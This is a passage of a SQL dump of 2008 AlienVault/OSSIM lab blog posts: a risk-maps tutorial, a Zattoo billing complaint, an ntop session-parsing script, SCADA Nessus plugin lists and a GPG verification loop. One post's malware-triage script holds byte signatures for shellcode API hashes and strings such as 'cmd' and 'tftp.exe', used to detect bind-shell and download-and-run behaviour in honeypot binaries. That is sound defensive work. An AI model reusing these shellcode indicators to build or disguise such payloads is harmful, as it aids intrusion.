indicatorsConfigurationOur next screenshot features the configuration interface for all of this.(Image removed, broken link, I’m very sorry. DK.) And again, with the upload part collapsed:(Image removed, broken link, I’m very sorry. DK.).You’ve got options to upload maps and icons (icons require a custom name). After having uploaded all the maps you want to configure and all the icons you want to use (besides the default provided ones), you’re ready to go.Toggling away the maps section (we’ll replace that nasty link with something niftier) would be a nice first step, leaving only the map and the lower section.After this, we’ve got four things to decide:Choose an iconChoose an element to report on (more on this later)Assign a nameLink to another map or to a random url (want to exted this to provide links to standard places across ossim)Except the link url, the other three elements are mandatory.The next image shows the nifty icon selector, which uses Lytebox [www.dolem.com/lytebox/] as backend. It allows you to choose icons of your own or select from a set of default icons.(Image removed, broken link, I’m very sorry. DK.).As for objects, those usable for placement include:HostsNetworksHost groupsNetwork groupsServersSensorsBusinessprocessesOnce that is choosen, you’ll add a new indicator. This will place the icon along with it’s indicator on the map, allowing you to move itLast but not least, there’s also the ability to add “hot-zones” for those areas where you want to delve into deeper detail. The next image shows a square around Australia, which we could link to a site with info about it, or even better, to a more detailed map with provices/areas and indicators.(Image removed, broken link, I’m very sorry. DK.).This has been a brief introduction to the subject, more in-depth information along with how those three final indicators are being calculated will be posted on a follow-up.From here on what you do is up to your imagination, I guess more obvious environments are those mapping a high level network map of your company to some lower level ones, drilling down on host and network status that way.', 'tutorialriskmapsindicators', '/blogs/labs-research/tutorial-7-feature-highlight-pre-tutorial-on-risk-maps');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (173, 'Zattoo… Scam ?', 'Dominique Karg', 'August 22, 2008 ', '#tags zattoo,tv,scamAfter having used their service for quite some time I received the announcement that they wanted to start charging users a samll fee. I’m talking about Zattoo. Quoting their site:Zattoo is real TV on your PC - andd it’s absolutely free. It’s the football game as you chat, the news as you email, and your favorite soap as you pay your bills. Zattoo is also TV when you don’t have a TV - it’s the channels you want, when you want, where you want.Well, completely free obviously not anymore, but that doesn’t matter. I don’t know how well known / widely used this service is outside of Europe, but I’ve got many frieds here that actually used it.Fact is I wanted to see a soccer match last evening on my computer, in order to let my GF watch here stuff on the big screen. I decided to pay the 2.40 euro (as can be seen here, sending the two sms with ZAT to 7766. After two hours I still didn’t have my code (so bye bye match) and after 24 hours and two mails, both using the support form as well as the info email address I’m still waiting for an answer/activation code.2.40 ain’t that much money, but things like these are very annoying. Until I get an answer from them I consider this new “pay-per-view” service a true SCAM, con, swindle, grift, gaffle, bunko, flim flam, stratagem, or scheme (wikipedia ;-) ), since after using the service for a couple of months and getting confident with the people at Zattoo I’ve paid for a service which I haven’t received yet, there’s no info about reclamations, payment confirmation, receipt, etc etc…Update 2008/08/18 - First contact from Zattoo, quite dissapointingGot a mail last night from them:Hi,Thanks for contacting Zattoo. If you have not received the activation code, you will have to contact Allopass (http://www.es.allopass.com/contact_accueil.php4). They send the codes, not Zattoo.Yours kindly,Zattoo SpainSo I know how this story will be evolving. Have you read The Twelve Tasks of Asterix ? I always feel like in the 8th task when something doesn’t work out 100% with obscure/big companies or government:Quoting:Find Permit 838 in “The Place That Sends You Mad”. A mind-numbing multi-storey building founded on bureaucracy and staffed by clinically unhelpful people who direct all their clients to other similarly unhelpful people elsewhere in the building. Asterix eventually beats them at their own game by asking for an imaginary permit that nobody knows about, sending the place into disarray. Eventually Asterix is given Permit 838 just to make him leave and stop causing trouble.So next task: write to the friendly people at the other company. I feel like this will take a long long time…My mail to the new company, I wonder how long it will take them to answer:To whom it may concern,On wednesday 2008/08/13 at 19:10 I sent two sms messages to the number “7766” with codeword “ZAT” in it.I was supposed to receive a activation code for Zattoo which never arrived. Yesterday evening I finally got an answer from Zattoo where they state that they don’t have to do anything with payments, that I should refer to you.So this is my mail / compliant, I’ve paid for the service five days ago and still haven’t received any answer/feedback or even the product.The phone number where I sent the sms messages from (2x) is 627xxxxxx.Thanks in advance for your attention in this matter.', 'scamzattootv', '/blogs/labs-research/zattoo-scam');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (174, 'NTop session query script', 'Dominique Karg', 'August 22, 2008 ', 'While coding the session monitor a couple of weeks ago I developed a quick script which could query ntop for session information. Jaime started using it for graphing now, so I thought it might be useful to soembody. \nimport sgmllib, re, sys\n\nimport socket\n\nfrom sets import Set\n\n\n\n\n\nclass MyParser(sgmllib.SGMLParser):\n\n    \"A simple parser class.\"\n\n\n\n    def parse(self, s):\n\n        \"Parse the given string \'s\'.\"\n\n        self.feed(s)\n\n        self.close()\n\n\n\n    def __init__(self, verbose=0):\n\n        \"Initialise an object, passing \'verbose\' to the superclass.\"\n\n\n\n        sgmllib.SGMLParser.__init__(self, verbose)\n\n        self.starting_description = 0\n\n        self.inside_table_element = 0\n\n        self.inside_table_row = 0\n\n        self.in_session = 0\n\n        self.td_count = 0\n\n        self.seen  = 0\n\n\n\n        self.sessions = []\n\n        self.session_num = 0\n\n        \n\n        self.queried_ip = \"\"\n\n\n\n        self.dst_port_group = {}\n\n        self.src_port_group = {}\n\n\n\n        self.source_ip = \"\"\n\n        self.source_port = \"\"\n\n        self.dest_ip = \"\"\n\n        self.dest_port = \"\"\n\n        self.data_sent = 0\n\n        self.data_rcvd = 0\n\n        self.active_since = \"\"\n\n        self.last_seen = \"\"\n\n        self.duration = 0\n\n        self.inactive = 0\n\n\n\n    def tosecs(self, data):\n\n\n\n        # example: 27 sec\n\n        if data.endswith(\'sec\'):\n\n            data = data.split(\' \', 1)[0]\n\n\n\n        # examples: 1 day  1:52:27\n\n        #           2 days 4:56:23\n\n        elif data.__contains__(\'day\'):\n\n            result = re.findall(\'(\\d+) days? (\\S+)\', data)\n\n            (days, time) = result[0]\n\n            seconds = int(days) * 86400\n\n\n\n            dt = time.split(\':\')\n\n            seconds += int(dt.pop())\n\n            try:\n\n                seconds += seconds + int(dt.pop()) * 60\n\n                seconds += seconds + int(dt.pop()) * 3600\n\n            except IndexError:\n\n                pass\n\n            data = str(seconds)\n\n    \n\n        # example: 1:52:27\n\n        else:\n\n            dt = data.split(\':\')\n\n            seconds = int(dt.pop())\n\n            try:\n\n                seconds += int(dt.pop()) * 60\n\n                if len(dt) == 3:\n\n                    seconds += int(dt.pop()) * 3600\n\n            except IndexError:\n\n                pass\n\n            data = str(seconds)\n\n    \n\n\n\n        return data\n\n\n\n    def start_td(self, attributes):\n\n        self.td_count += 1\n\n        self.inside_table_element = 1\n\n\n\n    def end_td(self):\n\n        self.inside_table_element = 0\n\n        self.seen = 0\n\n\n\n    def start_tr(self, attributes):\n\n        self.inside_table_row = 1\n\n\n\n    def end_tr(self):\n\n        self.inside_table_row = 0\n\n        self.td_count = 0\n\n        if self.in_session and self.source_ip:\n\n            self.session_num += 1\n\n            tmp = \"%s:%s --> %s:%s (%f %f) duration: %s\" % \\\n\n(self.source_ip,self.source_port,self.dest_ip,self.dest_port, self.data_sent, self.data_rcvd, self.duration)\n\n            self.sessions.append(tmp)\n\n\n\n    def start_a(self, attributes):\n\n        self.inside_table_row = 1\n\n        for name, value in attributes:\n\n            if name == \"href\" and self.in_session:\n\n                matches = re.findall(\"\\d+\\.\\d+\\.\\d+\\.\\d+\",value)\n\n                if len(matches) > 0:\n\n                    if self.td_count is 1:\n\n                        self.source_ip = matches[0]\n\n                    elif self.td_count is 2:\n\n                        self.dest_ip = matches[0]\n\n\n\n    def handle_data(self, data):\n\n        if self.queried_ip is \"\":\n\n            matches = re.findall(\"(\\d+\\.\\d+\\.\\d+\\.\\d+)\",data)\n\n            if len(matches) > 0:\n\n                self.queried_ip = matches[0]\n\n\n\n        if data.__contains__(\"Active TCP/UDP Sessions\"):\n\n            self.in_session = 1\n\n\n\n        if data.__contains__(\"The color of the host\"):\n\n            self.sessions.append(\"NumSessions:%d\" % int(self.session_num))\n\n            self.in_session = 0\n\n            source_sessions = 0\n\n            dest_sessions = 0\n\n            for sess in self.sessions:\n\n                src_str = \"^%s:.*\" % self.queried_ip\n\n                dst_str = \"^\\d+\\.\\d+\\.\\d+\\.\\d+:\\d+\\s+-->\\s+%s:.*\" % self.queried_ip\n\n                src_sess = \"^%s:\\d+\\s+-->\\s+(\\d+\\.\\d+\\.\\d+\\.\\d+):(\\d+)\" % self.queried_ip\n\n                dst_sess = \"^(\\d+\\.\\d+\\.\\d+\\.\\d+):\\d+\\s+-->\\s+%s:(\\d+)\" % self.queried_ip\n\n                if re.findall(src_str, sess):\n\n                    source_sessions += 1\n\n                if re.findall(dst_str, sess):\n\n                    dest_sessions += 1\n\n                matches = re.findall(src_sess, sess)\n\n                if len(matches) > 0:\n\n                    if matches[0][1] in self.src_port_group:\n\n                        self.src_port_group[matches[0][1]].add(matches[0][0])\n\n                    else:\n\n                        self.src_port_group[matches[0][1]] = Set()\n\n                        self.src_port_group[matches[0][1]].add(matches[0][0])\n\n                matches = re.findall(dst_sess, sess)\n\n                if len(matches) > 0:\n\n                    if matches[0][1] in self.dst_port_group:\n\n                        self.dst_port_group[matches[0][1]].add(matches[0][0])\n\n                    else:\n\n                        self.dst_port_group[matches[0][1]] = Set()\n\n                        self.dst_port_group[matches[0][1]].add(matches[0][0])\n\n\n\n\n\n\n\n            self.sessions.append(\"SessionsAsSource:%s\" % source_sessions)\n\n            self.sessions.append(\"SessionsAsDest:%s\" % dest_sessions)\n\n            for port in self.src_port_group:\n\n                self.sessions.append(\"UniqPort%sAsSourceSessions:%d\" % (port, len(self.src_port_group[port])))\n\n            for port in self.dst_port_group:\n\n                self.sessions.append(\"UniqPort%sAsDestSessions:%d\" % (port, len(self.dst_port_group[port])))\n\n\n\n\n\n\n\n        if self.inside_table_element and self.in_session:\n\n            if self.td_count <= 2:\n\n                matches = re.findall(\":(\\w+)\",data)\n\n                if len(matches) > 0:\n\n                    try:\n\n                        port = socket.getservbyname(matches[0])\n\n                    except:\n\n                        port = matches[0]\n\n                    if self.td_count is 1:\n\n                        self.source_port = port\n\n                    elif self.td_count is 2:\n\n                        self.dest_port = port\n\n\n\n            elif self.td_count is 3:\n\n                if self.seen == 0:\n\n                    self.data_sent = float(data)\n\n                    self.seen = 1\n\n                else:\n\n                    if data.__contains__(\"KB\"):\n\n                        self.data_sent *= 1024\n\n                    elif data.__contains__(\"MB\"):\n\n                        self.data_sent *= 1024 * 1024\n\n                    elif data.__contains__(\"GB\"):\n\n                        self.data_sent *= 1024 * 1024 * 1024\n\n                    self.seen = 0\n\n\n\n            elif self.td_count is 4:\n\n                if self.seen == 0:\n\n                    self.data_rcvd = float(data)\n\n                    self.seen = 1\n\n                else:\n\n                    if data.__contains__(\"KB\"):\n\n                        self.data_rcvd *= 1024\n\n                    elif data.__contains__(\"MB\"):\n\n                        self.data_rcvd *= 1024 * 1024\n\n                    elif data.__contains__(\"GB\"):\n\n                        self.data_rcvd *= 1024 * 1024 * 1024\n\n                    self.seen = 0\n\n\n\n            elif self.td_count is 5:\n\n                self.active_since = data\n\n\n\n            elif self.td_count is 6:\n\n                self.last_seen = data\n\n\n\n            elif self.td_count is 7:\n\n                self.duration = self.tosecs(data)\n\n\n\n            elif self.td_count is 8:\n\n                self.inactive = self.tosecs(data)\n\n\n\n    def get_sessions(self):\n\n        return self.sessions\n\n\n\n# Real start\n\n\n\nimport urllib, sgmllib\n\n\n\nargv = sys.argv\n\ntry:\n\n    ntop = argv[1]\n\n    ip = argv[2]\n\nexcept:\n\n    print \"Prints out session information about a given host\"\n\n    print \"Usage: \" + argv[0] + \" ntop_ip host_ip\"\n\n    sys.exit()\n\n\n\n# Get something to work with.\n\nf = None\n\ntry:\n\n    f = urllib.urlopen(\"http://\" + ntop + \":3000/\" + ip + \".html\")\n\nexcept:\n\n    print \"Unable to connect to \" + ntop\n\n    sys.exit()\n\ns = f.read()\n\n\n\n# Try and process the page.\n\n# The class should have been defined first, remember.\n\nmyparser = MyParser()\n\nmyparser.parse(s)\n\n\n\na = myparser.get_sessions()\n\n\n\nprint \"Sessions for \" + ip\n\nprint \"--------------------------\"\n\n\n\nfor b in a:\n\n    print b\n\nThe output looks somewhat like this:\nGestalt:ntop dk$ python session_query.py 192.168.1.2 192.168.1.2\n\nSessions for 192.168.1.2\n\n--------------------------\n\n192.168.1.43:2409 --> 192.168.1.2:3000 (567.000000 2662.400000) duration: 0\n\n192.168.1.2:39492 --> 195.77.186.178:33800 (74240.000000 75264.000000) duration: 406\n\n192.168.1.2:45206 --> 195.55.170.126:33800 (140595.200000 143974.400000) duration: 644\n\n192.168.1.2:54151 --> 207.158.15.208:443 (1153433.600000 1153433.600000) duration: 637\n\n192.168.1.35:59334 --> 192.168.1.2:3000 (258.000000 112.000000) duration: 0\n\nNumSessions:5\n\nSessionsAsSource:3\n\nSessionsAsDest:2\n\nUniqPort443AsSourceSessions:1\n\nUniqPort33800AsSourceSessions:2\n\nUniqPort3000AsDestSessions:2\n\nGestalt:ntop dk$ \n\nAaah, and with a little trick also the main session page can be parsed:\nGestalt:ntop dk$ python session_query.py 192.168.1.2 NetNetstat\n\nSessions for NetNetstat\n\n--------------------------\n\n192.168.1.43:2409 --> 192.168.1.2:3000 (567.000000 2662.400000) duration: 0\n\n192.168.1.2:39492 --> 195.77.186.178:33800 (75366.400000 76288.000000) duration: 459\n\n192.168.1.2:45206 --> 195.55.170.126:33800 (141721.600000 144896.000000) duration: 706\n\n192.168.1.2:54151 --> 207.158.15.208:443 (1153433.600000 1153433.600000) duration: 695\n\n192.168.1.35:59337 --> 192.168.1.2:3000 (257.000000 112.000000) duration: 0\n\nNumSessions:5\n\nSessionsAsSource:0\n\nSessionsAsDest:1\n\nUniqPort33800AsDestSessions:1\n\nGestalt:ntop dk$ \n\nAs a finishing note, we did setup another blog with ossim-related info: Santi’s blog. As an opener he features a demo video with a sample presentation done to a customer.', 'ossimsessionsntop', '/blogs/labs-research/ntop-session-query-script');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (175, '3d Nmap', 'Jaime Blasco', 'August 20, 2008 ', 'Here is a screenshot of a project I’m working on. The tool parse XML nmap scan files and shows an interactive 3d environment where you can inspect nmap scanning results.I’m developing with XNA (C#). I’ll will publish the code as soon as I fix some errors.', 'nmapsecurity visualization3d', '/blogs/labs-research/3d-nmap');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (176, 'Last Scada OPC Nessus Plugins', 'Jaime Blasco', 'August 11, 2008 ', 'We have released some new Nessus Plugins related to OPC Servers security issues.List of New OPC Nessus Plugins:Multiple vulnerabilities in Comsoft Profibus OPC serverMultiple vulnerabilities in Beijer Electronics OPC serverMultiple vulnerabilities in VIPA OPC serverMultiple vulnerabilities in Gesytec Easylon OPC server 2.0Multiple vulnerabilities in Junzhi BACnet OPC serverMultiple vulnerabilities in IPCDAS NAPOPC OPC serverMultiple vulnerabilities in Klinkmann SPA OPC serverMultiple vulnerabilities in Newron System NLOPC OPC serverMultiple vulnerabilities in Wizcon Supervisor OPC DA Server', 'nessusscadaopc', '/blogs/labs-research/last-scada-opc-nessus-plugins');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (177, 'New Scada OPC Nessus Plugins', 'Jaime Blasco', 'August 11, 2008 ', 'Today we have released some new Nessus Plugins related to OPC Servers security issues.List of New OPC Nessus Plugins:Multiple vulnerabilities in KEPware KEPServerEx 4 OPC server  Multiple vulnerabilities in Triangle MicroWorks OPC Server 2.0.2Multiple vulnerabilities in Comsoft L1 OPC serverWe’ll release new plugins related to OPC and Scada in general during the next weeks!!!', 'nessusscadaopc', '/blogs/labs-research/new-scada-opc-nessus-plugins');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (178, 'An approach to malware collection log visualization', 'Jaime Blasco', 'August 6, 2008 ', 'I have just published an article related to malware collection log visualization.The paper focus on visualization of Nepenthes logs using AfterGlow. In the paper you can find information about correlation ips with countries and binary files with ClamAV signatures with the goal of generating interesting graphs.Get it here', 'malwarelog analysissecurity visualization', '/blogs/labs-research/an-approach-to-malware-collection-log-visualization');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (179, 'Visualization of Api calls and Imported symbols of malware binary files', 'Jaime Blasco', 'August 6, 2008 ', 'I’m developing a tool to extract interesting information from malware files with the goal of generating a relation graph.The tool extract api calls and imported symbols of binary files, I?ve make some interesting graph from malware files collected by Nepenthes.#\n\n#	Jaime Blasco - jaime.blasco[at]alienvault.com\n\n#	\n\n#	Thanks to Jan Goebel\n\n#	[Amun - low interaction honeypot]\n\n#\n\n\n\nimport sys\n\nimport os\n\nimport re\n\n\n\ndef start(content, name):\n\n	### api\n\n	checksbin = {}\n\n	checksbin[\'listen\'] = re.compile(\'\\\\xa4\\\\xad\\\\x2e\\\\xe9\', re.S|re.I)\n\n	checksbin[\'bind\'] = re.compile(\'\\\\xa4\\\\x1a\\\\x70\\\\xc7\', re.S|re.I)\n\n	checksbin[\'closeSocket\'] = re.compile(\'\\\\xe7\\\\x79\\\\xc6\\\\x79\', re.S|re.I)\n\n	checksbin[\'accept\'] = re.compile(\'\\\\xe5\\\\x49\\\\x86\\\\x49\', re.S|re.I)\n\n	checksbin[\'LoadLibraryA\'] = re.compile(\'\\\\x8e\\\\x4e\\\\x0e\\\\xec\', re.S|re.I)\n\n	checksbin[\'WSASocketA\'] = re.compile(\'\\\\xd9\\\\x09\\\\xf5\\\\xad\', re.S|re.I)\n\n	checksbin[\'WSAStartup\'] = re.compile(\'\\\\xCB\\\\xED\\\\xFC\\\\x3B\', re.S|re.I)\n\n	checksbin[\'ExitProcess\'] = re.compile(\'\\\\x7e\\\\xd8\\\\xe2\\\\x73\', re.S|re.I)\n\n	checksbin[\'CreateProcessA\'] = re.compile(\'\\\\x72\\\\xfe\\\\xb3\\\\x16\', re.S|re.I)\n\n	checksbin[\'WaitForSingleObject\'] = re.compile(\'\\\\xad\\\\xd9\\\\x05\\\\xce\', re.S|re.I)\n\n	checksbin[\'system\'] = re.compile(\'\\\\x44\\\\x80\\\\xc2\\\\x77\', re.S|re.I)\n\n	checksbin[\'SetStdHandle\'] = re.compile(\'\\\\x1d\\\\x20\\\\xe8\\\\x77\', re.S|re.I)\n\n	checksbin[\'GetProcAddress\'] = re.compile(\'\\\\xcc\\\\x10\\\\xbe\\\\x77\', re.S|re.I)\n\n	checksbin[\'URLDownloadToFileA\'] = re.compile(\'\\\\x36\\\\x1a\\\\x2f\\\\x70\', re.S|re.I)\n\n	checksbin[\'connect\'] = re.compile(\'\\\\xec\\\\xf9\\\\xaa\\\\x60\', re.S|re.I)\n\n	checksbin[\'socket\'] = re.compile(\'\\\\x6e\\\\x0b\\\\x2f\\\\x49\', re.S|re.I)\n\n	checksbin[\'socket2\'] = re.compile(\'\\\\x83\\\\x53\\\\x83\\\\x00\', re.S|re.I)\n\n	checksbin[\'send\'] = re.compile(\'\\\\xa4\\\\x19\\\\x70\\\\xe9\', re.S|re.I)\n\n	checksbin[\'receive\'] = re.compile(\'\\\\xb6\\\\x19\\\\x18\\\\xe7\', re.S|re.I)\n\n	checksbin[\'WinExec\'] = re.compile(\'\\\\x98\\\\xfe\\\\x8a\\\\x0e\', re.S|re.I)\n\n	checksbin[\'WriteFile\'] = re.compile(\'\\\\x1f\\\\x79\\\\x0a\\\\e8\', re.S|re.I)\n\n	checksbin[\'Unknown (sign for correct decryption)\'] = re.compile(\'\\\\x68\\\\x33\\\\x32\\\\x00\\\\x00\\\\x68\\\\x77\\\\x73\\\\x32\\\\x5F\', re.S|re.I)\n\n\n\n	### plain\n\n	checksplain = {}\n\n	checksplain[\'possible windows cmd\'] = re.compile(\'\\\\x63\\\\x6d\\\\x64\', re.S|re.I)\n\n	checksplain[\'http address\'] = re.compile(\'\\\\x68\\\\x74\\\\x74\\\\x70\\\\x3a\\\\x2f\\\\x2f\', re.S|re.I)\n\n	checksplain[\'ftp address\'] = re.compile(\'\\\\x66\\\\x74\\\\x70\\\\x3a\\\\x2f\\\\x2f\', re.S|re.I)\n\n	checksplain[\'tftp.exe\'] = re.compile(\'\\\\x74\\\\x66\\\\x74\\\\x70\\\\x2e\\\\x65\\\\x78\\\\x65\', re.S|re.I)\n\n	checksplain[\'WSAStartup\'] = re.compile(\'\\\\x57\\\\x53\\\\x41\\\\x53\\\\x74\\\\x61\\\\x72\\\\x74\\\\x75\\\\x70\', re.S|re.I)\n\n	checksplain[\'WSASocketA\'] = re.compile(\'\\\\x57\\\\x53\\\\x41\\\\x53\\\\x6f\\\\x63\\\\x6b\\\\x65\\\\x74\\\\x41\', re.S|re.I)\n\n	checksplain[\'GetProcAddress\'] = re.compile(\'\\\\x47\\\\x65\\\\x74\\\\x50\\\\x72\\\\x6f\\\\x63\\\\x41\\\\x64\\\\x64\\\\x72\\\\x65\\\\x73\\\\x73\',re.S|re.I)\n\n	checksplain[\'CreateProcessA\'] = re.compile(\'\\\\x43\\\\x72\\\\x65\\\\x61\\\\x74\\\\x65\\\\x50\\\\x72\\\\x6f\\\\x63\\\\x65\\\\x73\\\\x73\\\\x41\', re.S|re.I)\n\n	checksplain[\'CreateFileA\'] = re.compile(\'\\\\x43\\\\x72\\\\x65\\\\x61\\\\x74\\\\x65\\\\x46\\\\x69\\\\x6c\\\\x65\\\\x41\', re.S|re.I)\n\n\n\n	### plain imported symbols\n\n	checksplainimport = {}\n\n	checksplainimport[\'kernel32\'] = re.compile(\'\\\\x6b\\\\x65\\\\x72\\\\x6e\\\\x65\\\\x6c\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'USER32\'] = re.compile(\'\\\\x55\\\\x53\\\\x45\\\\x52\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'MSVCR80\'] = re.compile(\'\\\\x4d\\\\x53\\\\x56\\\\x43\\\\x52\\\\x38\\\\x30\',re.S|re.I)\n\n	checksplainimport[\'ws2_32\'] = re.compile(\'\\\\x77\\\\x73\\\\x32\\\\x5f\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'shell32\'] = re.compile(\'\\\\x73\\\\x68\\\\x65\\\\x6c\\\\x6c\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'gdi32\'] = re.compile(\'\\\\x67\\\\x64\\\\x69\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'oleaut32\'] = re.compile(\'\\\\x6f\\\\x6c\\\\x65\\\\x61\\\\x75\\\\x74\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'advapi32\'] = re.compile(\'\\\\x61\\\\x64\\\\x76\\\\x61\\\\x70\\\\x69\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'COMCTL32\'] = re.compile(\'\\\\x43\\\\x4f\\\\x4d\\\\x43\\\\x54\\\\x4c\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'wsock32\'] = re.compile(\'\\\\x77\\\\x73\\\\x6f\\\\x63\\\\x6b\\\\x33\\\\x32\',re.S|re.I)\n\n	checksplainimport[\'URLMON\'] = re.compile(\'\\\\x55\\\\x52\\\\x4c\\\\x4d\\\\x4f\\\\x4e\',re.S|re.I)\n\n	checksplainimport[\'msvcrt\'] = re.compile(\'\\\\x6d\\\\x73\\\\x76\\\\x63\\\\x72\\\\x74\',re.S|re.I)\n\n	checksplainimport[\'CRTDLL\'] = re.compile(\'\\\\x43\\\\x52\\\\x54\\\\x44\\\\x4c\\\\x4c\',re.S|re.I)\n\n	checksplainimport[\'WININET\'] = re.compile(\'\\\\x57\\\\x49\\\\x4e\\\\x49\\\\x4e\\\\x45\\\\x54\',re.S|re.I)\n\n	checksplainimport[\'ntdll\'] = re.compile(\'\\\\x6e\\\\x74\\\\x64\\\\x6c\\\\x6c\',re.S|re.I)\n\n\n\n	keys = checksplain.keys()\n\n	for key in keys:\n\n		match = checksplain[key].search(content)\n\n		if match:\n\n			print name + \",\" + key + \",2\"\n\n\n\n	keys = checksbin.keys()\n\n	for key in keys:\n\n		match = checksbin[key].search(content)\n\n		if match:\n\n			print name + \",\" + key + \",2\"\n\n\n\n	keys = checksplainimport.keys()\n\n	for key in keys:\n\n		match = checksplainimport[key].search(content)\n\n		if match:\n\n			print name + \",\" + key + \",1\"\n\n\n\nif __name__ == \'__main__\':\n\n	list = os.listdir(\"binaries/\")\n\n	for filename in list:\n\n		if os.path.exists(\"binaries/\" + filename):\n\n			fp = open(\"binaries/\" + filename, \'r\')\n\n			content = \"\".join(fp.readlines())\n\n			fp.close()\n\n			start(content, filename)The tool generate a CSV files which can be use with Afterglow to simple generate graphsAn output of the tool looks like:[email protected]# python functions.py\n\n8a7b16ac83afbc89dd14885eea04fd64,GetProcAddress,2\n\n8a7b16ac83afbc89dd14885eea04fd64,WinExec,2\n\n8a7b16ac83afbc89dd14885eea04fd64,kernel32,1\n\n8a7b16ac83afbc89dd14885eea04fd64,USER32,1\n\n8ee8619debba32adbb40045316559dde,GetProcAddress,2\n\n8ee8619debba32adbb40045316559dde,kernel32,1\n\n8ee8619debba32adbb40045316559dde,ntdll,1\n\n18b3e69b9ba5b0cad8a04d329f34a94c,GetProcAddress,2\n\n18b3e69b9ba5b0cad8a04d329f34a94c,kernel32,1\n\n18b3e69b9ba5b0cad8a04d329f34a94c,USER32,1\n\n6439ad20608e07380428ca0dc7574c41,CreateFileA,2\n\n6439ad20608e07380428ca0dc7574c41,kernel32,1\n\n...\n\n...The first column is the md5 of the file, the second is the name of the Api call or imported symbol and the third identyfies:1: Imported Symbol2: Api callThe color.properties file I made to generate the graphs looks like:color.target=\"lightblue\" if ($fields[2]==2)\n\ncolor.target=\"green\" if ($fields[2]==1)\n\ncolor.source=\"red\"', 'malwarevisualization', '/blogs/labs-research/visualization-of-api-calls-and-imported-symbols-of-malware-binary-files');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (180, 'Scada: OPC Nessus Plugins', 'Jaime Blasco', 'August 6, 2008 ', 'During the development of the Free Nessus Feed we are writing some interesting plugins about Scada.Today we released some plugins relating to OPC (OLE for Process Control) Servers, OPC standard specifies the communication of real-time plant data between control devices from different manufacturers.List of OPC Nessus Plugins:Multiple vulnerabilities in NETxEIB OPC server CVE-2007-1313Multiple vulnerabilities in Takebishi Electric DeviceXplorer FA-M3 OPC server CVE-2007-1313Multiple vulnerabilities in Takebishi Electric DeviceXplorer HIDIC OPC server CVE-2007-1319Multiple vulnerabilities in Takebishi Electric DeviceXplorer MELSEC OPC server CVE-2007-1319Multiple vulnerabilities in Takebishi Electric DeviceXplorer SYSMAC OPC server CVE-2007-1319We have write some functions for accesing DCOM Applications information throught WMI.', 'nessusscadaopc', '/blogs/labs-research/scada-opc-nessus-plugins');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (181, 'Showing relation graph between nessus scripts and include files', 'Jaime Blasco', 'August 6, 2008 ', 'I have make an interesting graph showing the relation between nessus scripts and include files', 'nessusvisualization', '/blogs/labs-research/showing-relation-graph-between-nessus-scripts-and-include-files');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (182, 'Plugin GPG signature verification script', 'Dominique Karg', 'August 6, 2008 ', 'Just had to write a quick script in order to regularly check the repository, wanted to share it.for i in *.asc; do gpg—verify $i 2>/dev/null; if [ $? == 1 ]; then echo; echo “Bad Sig: $i”; read; else echo -n “.”; fi; done', 'nessusfeedscriptgpg', '/blogs/labs-research/plugin-gpg-signature-verification-script');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (183, 'New Forums', 'Dominique Karg', 'May 15, 2008 ', 'I’m proud to announce the avilability of our brand new forum infrastructure. We were getting really tired in the end by the lack of features of the sf.net forums, so we decided to setup FUDForum on ossim.netI for myself am very motivated by this changes, I was getting crazy with the old environment and promised myself to answer many more things on these new forums.\nEnjoy: ossim.net forums https://www.ossim.net/forum/ [no longer available].', 'forumssupportannouncement', '/blogs/labs-research/new-forums');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (184, 'You are invited to take part in The Google Summer of Code(tm) 2008', 'Dominique Karg', 'March 17, 2008 ', 'Yay ! we’re proud to announce that ossim has been chosen to take part int he google summer of code program. Brian, now it’s your turn ;-).I’ll post another entry when we’ve got more information about how this works.\nCongratulations!\n\nYour organization \"OSSIM: Open Source Security Information Management\" has been accepted in to the \n\nGoogle Summer of Code(tm) 2008. You have been assigned as primary point of contact and as an \n\nadministrator for your organization.\n\nplease visit http://code.google.com/soc/mentor_step1.html and sign up using your Google Account.\n\nThanks.\n\n- Your friendly Google Summer of Code administrators', 'ossimsocgoogle', '/blogs/labs-research/you-are-invited-to-take-part-in-the-google-summer-of-codetm-2008');
